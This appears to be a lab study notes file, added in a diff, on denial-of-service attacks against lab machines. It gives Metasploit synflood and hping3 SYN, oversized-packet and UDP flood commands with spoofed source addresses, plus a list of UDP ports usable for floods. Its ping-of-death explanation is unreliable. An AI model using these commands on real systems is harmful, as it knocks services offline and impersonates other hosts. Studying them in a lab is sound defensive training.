@@ -1,0 +1,49 @@
+# Perform a DoS Attack (SYN Flooding) on a Target Host using Metasploit
+-----------------------------------------------------------------------
+1.  nmap -p 21 (Target IP address)
+2. msfconsole  >>  use auxiliary/dos/tcp/synflood  >> show options 
+  > set RHOST (Target IP Address) (here, 10.10.1.11)
+  > set RPORT 21
+  > set SHOST (Spoofable IP Address) (here, 10.10.1.19)   [By setting the SHOST option to the IP address of the Windows Server 2019 machine, you are spoofing the IP address of the Parrot Security machine with that of Windows Server 2019]
+  > exploit
+3. observe packets through wireshark on target machine (windows 11 / 10.10.1.11)
+
+
+# Perform a DoS Attack on a Target Host using hping3
+---------------------------------------------------
+1. hping3 -S (Target IP Address/10.10.1.11) -a (Spoofable IP Address) -p 22 --flood   (hping3 floods the victim machine by sending bulk SYN packets and overloading the victim’s resources)
+  [-S: sets the SYN flag; 
+  -a: spoofs the IP address(10.10.1.19); 
+  -p: specifies the destination port; and 
+  --flood: sends a huge number of packets.]
+
+2. perform a PoD(ping of death) attack : In a PoD attack, the attacker tries to crash, freeze, or destabilize the targeted system or service by sending malformed or oversized packets using a simple ping command.
+For example, the attacker sends a packet that has a size of 65,538 bytes to the target web server. This packet size exceeds the size limit prescribed by RFC 791 IP, which is 65,535 bytes. The receiving system’s reassembly process might cause the system to crash.
+   >>>  hping3 -d 65538 -S -p 21 --flood (Target IP Address / 10.10.1.11)
+  [-d: specifies data size; 
+  -S: sets the SYN flag; 
+  -p: specifies the destination port; and 
+  --flood: sends a huge number of packets.]
+
+3. UDP application layer flood attack on the Windows Server 2019 machine using NetBIOS port 139 : 
+  >>> nmap -p 139 (Target IP Address/10.10.1.19) (we will use NetBIOS port 139 to perform a UDP application layer flood attack.)
+  >>> hping3 -2 -p 139 --flood (Target IP Address) (here, the target IP address is 10.10.1.19 [Windows Server 2019]) 
+  >>> [-2: specifies the UDP mode; -p: specifies the destination port; and --flood: sends a huge number of packets.]
+  >>> Here, we have used NetBIOS port 139 to perform a UDP application layer flood attack. Similarly, you can employ other application layer protocols to perform a UDP application layer flood attack on a target network.
+Some of the UDP based application layer protocols that attackers can employ to flood target networks include:
+CharGEN (Port 19)
+SNMPv2 (Port 161)
+QOTD (Port 17)
+RPC (Port 135)
+SSDP (Port 1900)
+CLDAP (Port 389)
+TFTP (Port 69)
+NetBIOS (Port 137,138,139)
+NTP (Port 123)
+Quake Network Protocol (Port 26000)
+VoIP (Port 5060)
+
+# Perform a DoS Attack using Raven-storm
+--------------------------------------
+
+ 
